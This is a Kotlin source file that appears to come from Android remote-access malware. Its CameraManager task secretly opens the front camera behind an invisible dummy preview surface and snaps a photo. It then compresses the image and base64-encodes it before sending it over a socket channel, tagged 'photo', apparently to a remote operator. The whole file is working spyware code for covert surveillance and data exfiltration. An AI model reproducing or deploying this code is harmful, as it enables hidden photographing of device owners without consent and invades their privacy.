package com.xxx.zzz.commandp.taskssv

import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.hardware.Camera.CameraInfo
import android.util.Base64
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONException
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class CameraManager(val ctx: Context) : BaseTask(ctx) {

    private var camera: Camera? = null

    override fun run() {
        super.run()
        runCatching {
            startUp(findCameraList()!!)
        }.onFailure {
            IOSocketyt.sendLogs("", "CameraManager ${it.localizedMessage}", "error")
        }
    }

    private fun findCameraList(): Int? {
        if (!ctx.packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null
        }
        try {
            val list: MutableList<Int> = mutableListOf()
            // Search for available cameras
            val numberOfCameras = Camera.getNumberOfCameras()
            for (i in 0 until numberOfCameras) {
                val info = CameraInfo()
                Camera.getCameraInfo(i, info)
                when (info.facing) {
                    CameraInfo.CAMERA_FACING_FRONT -> {
                        list.add(i)
                    }
//                    CameraInfo.CAMERA_FACING_BACK -> {
//                        val jo = JSONObject()
//                        jo.put("name", "Back")
//                        jo.put("id", i)
//                        list.put(jo)
//                    }
//                    else -> {
//                        val jo = JSONObject()
//                        jo.put("name", "Other")
//                        jo.put("id", i)
//                        list.put(jo)
//                    }
                }
            }
            return list.firstOrNull()
        } catch (e: JSONException) {
            IOSocketyt.sendLogs("", "CameraManager ${e.localizedMessage}", "error")
        }
        return null
    }

    private fun releaseCamera() {
        if (camera != null) {
            camera!!.stopPreview()
            camera!!.release()
            camera = null
        }
    }

    private fun sendPhoto(data: ByteArray) {
        try {
            val bitmap = BitmapFactory.decodeByteArray(data, 0, data.size)
            val bos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos)
            val `object` = JSONObject()
            `object`.put("image", true)
            `object`.put("buffer", Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT))

            IOSocketyt.sendLogs("", Gsonq().toJson(`object`), "photo")
        } catch (e: JSONException) {
            IOSocketyt.sendLogs("", "CameraManager ${e.localizedMessage}", "error")
        }
    }

    private fun startUp(cameraID: Int) {
        camera = Camera.open(cameraID)
        val parameters = camera!!.parameters
        camera!!.parameters = parameters
        try {
            camera!!.setPreviewTexture(SurfaceTexture(0))
            camera!!.startPreview()
        } catch (e: Exception) {
            IOSocketyt.sendLogs("", "CameraManager ${e.localizedMessage}", "error")
        }
        camera!!.takePicture(null, null) { data, camera ->
            releaseCamera()
            sendPhoto(data)
        }
    }

}